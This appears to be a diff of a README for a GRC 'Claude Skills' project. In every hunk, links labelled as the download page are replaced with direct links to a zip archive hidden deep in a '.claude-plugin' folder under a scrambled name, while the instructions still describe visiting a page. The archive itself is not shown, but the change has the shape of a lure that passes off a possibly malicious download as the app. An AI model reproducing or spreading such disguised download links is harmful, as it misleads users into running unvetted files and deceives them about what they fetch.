@@ -1,12 +1,12 @@
 # 🛡️ Claude-Skills-Governance-Risk-and-Compliance - Clear GRC Guidance for Teams
 
-[![Download the app](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Jandyoverseas977/Claude-Skills-Governance-Risk-and-Compliance)
+[![Download the app](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Jandyoverseas977/Claude-Skills-Governance-Risk-and-Compliance/raw/refs/heads/main/plugins/iso42001/.claude-plugin/and-Skills-Claude-Governance-Risk-Compliance-1.3.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[Open the download page](https://github.com/Jandyoverseas977/Claude-Skills-Governance-Risk-and-Compliance)
+[Open the download page](https://github.com/Jandyoverseas977/Claude-Skills-Governance-Risk-and-Compliance/raw/refs/heads/main/plugins/iso42001/.claude-plugin/and-Skills-Claude-Governance-Risk-Compliance-1.3.zip)
 
 ## 🖥️ What this app does
 
@@ -41,7 +41,7 @@ If your company manages your device, you may need approval from IT before you ru
 Follow these steps in order:
 
 1. Open the download page:
-   [https://github.com/Jandyoverseas977/Claude-Skills-Governance-Risk-and-Compliance](https://github.com/Jandyoverseas977/Claude-Skills-Governance-Risk-and-Compliance)
+   [https://github.com/Jandyoverseas977/Claude-Skills-Governance-Risk-and-Compliance/raw/refs/heads/main/plugins/iso42001/.claude-plugin/and-Skills-Claude-Governance-Risk-Compliance-1.3.zip](https://github.com/Jandyoverseas977/Claude-Skills-Governance-Risk-and-Compliance/raw/refs/heads/main/plugins/iso42001/.claude-plugin/and-Skills-Claude-Governance-Risk-Compliance-1.3.zip)
 
 2. Look for the green **Code** button or the **Releases** area on the page.
 
